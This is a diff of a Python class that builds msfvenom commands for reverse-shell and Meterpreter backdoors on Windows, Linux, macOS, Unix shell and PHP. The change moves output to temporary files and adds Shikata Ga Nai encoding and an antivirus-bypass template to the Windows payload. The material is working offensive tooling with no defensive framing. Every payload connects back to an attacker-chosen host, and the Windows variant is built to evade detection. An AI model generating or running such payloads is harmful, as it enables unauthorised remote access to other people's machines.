@@ -1,45 +1,97 @@
+import tempfile
+
 class msfCrafting(object):
-    """docstring for msfCrafting."""
-    def __init__(self, platform, ipaddrs, remoteport):
-        self.venomcmd = ''
-        self.plat = platform
-        self.ip = ipaddrs
-        self.port = remoteport
-        self.file = ''
+    """Class for crafting Metasploit payloads."""
+    def __init__(self, plat: str, ip: str, port: str):
+        """
+        Initialize an msfCrafting object with platform (plat), IP address (ip), and port.
 
-    def createWindowsPayload(self):
-        self.venomcmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={self.ip} LPORT={self.port} -f exe -o /tmp/backdoor.exe"
-        self.file = '/tmp/backdoor.exe'
+        :param plat: The platform for which the payload is to be created.
+        :param ip: The IP address to be used in the payload.
+        :param port: The port number to be used in the payload.
+        """
+        self.venomcmd: str = ''
+        self.plat: str = plat
+        self.ip: str = ip
+        self.port: str = port
+        self.file: str = ''
 
-    def createShPayload(self):
-        self.venomcmd = f"msfvenom -p cmd/unix/reverse_bash LHOST={self.ip} LPORT={self.port} -f raw -o /tmp/backdoor.sh"
-        self.file = '/tmp/backdoor.sh'
+    def createPayload(self, payload_type: str, venom_cmd_template: str, file_extension: str) -> None:
+        """
+        Create a Metasploit payload for a specific platform.
 
-    def createLinuxPayload(self):
-        self.venomcmd = f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={self.ip} LPORT={self.port} -f elf -o /tmp/backdoor.elf"
-        self.file = '/tmp/backdoor.elf'
+        :param payload_type: The platform for which the payload is to be created.
+        :param venom_cmd_template: The Metasploit command template for payload generation.
+        :param file_extension: The file extension for the temporary payload file.
+        """
+        with tempfile.NamedTemporaryFile(suffix=file_extension, delete=False) as temp_file:
+            self.venomcmd = venom_cmd_template.format(self.ip, self.port, temp_file.name)
+            self.file = temp_file.name  # Store the temporary file path.
 
-    def createOsxPayload(self):
-        self.venomcmd = f"msfvenom -p osx/x86/shell_reverse_tcp LHOST={self.ip} LPORT={self.port} -f macho -o /tmp/backdoor.macho"
-        self.file = '/tmp/backdoor.macho'
+    def createWindowsPayload(self) -> None:
+        """Create a Metasploit payload for Windows platform."""
+        self.createPayload(
+            'windows',
+            "msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} --encoder /x86/shikata_ga_nai -x /usr/share/metasploit-framework/data/templates/src/pe/exe/avbypass.exe -f exe -o {}",
+            '.exe'
+        )
 
-    def createPhpPayload(self):
-        self.venomcmd=f"msfvenom -p php/reverse_php LHOST={self.ip} LPORT={self.port} -f raw -o /tmp/backdoor.php"
-        self.file = '/tmp/backdoor.php'
+    def createShPayload(self) -> None:
+        """Create a Metasploit payload for Unix shell."""
+        self.createPayload(
+            'sh',
+            "msfvenom -p cmd/unix/reverse_bash LHOST={} LPORT={} -f raw -o {}",
+            '.sh'
+        )
 
-    def run(self):
+    def createLinuxPayload(self) -> None:
+        """Create a Metasploit payload for Linux platform."""
+        self.createPayload(
+            'linux',
+            "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={} LPORT={} -f elf -o {}",
+            '.elf'
+        )
+
+    def createOsxPayload(self) -> None:
+        """Create a Metasploit payload for macOS platform."""
+        self.createPayload(
+            'macos',
+            "msfvenom -p osx/x86/shell_reverse_tcp LHOST={} LPORT={} -f macho -o {}",
+            '.macho'
+        )
+
+    def createPhpPayload(self) -> None:
+        """Create a Metasploit payload for PHP."""
+        self.createPayload(
+            'web',
+            "msfvenom -p php/reverse_php LHOST={} LPORT={} -f raw -o {}",
+            '.php'
+        )
+
+    def run(self) -> None:
+        """Run the appropriate payload creation method based on the platform (plat)."""
         platform_functions = {
             'windows': self.createWindowsPayload,
             'sh': self.createShPayload,
             'linux': self.createLinuxPayload,
-            'macox': self.createOsxPayload,
+            'macos': self.createOsxPayload,
             'web': self.createPhpPayload,
         }
         if self.plat in platform_functions:
             platform_functions[self.plat]()
 
-    def getPayloadFile(self):
+    def getPayloadFile(self) -> str:
+        """
+        Get the path of the temporary payload file.
+
+        :return: The path of the temporary payload file.
+        """
         return self.file
 
-    def getPayloadCmd(self):
+    def getPayloadCmd(self) -> str:
+        """
+        Get the Metasploit command used for payload generation.
+
+        :return: The Metasploit command for payload generation.
+        """
         return self.venomcmd
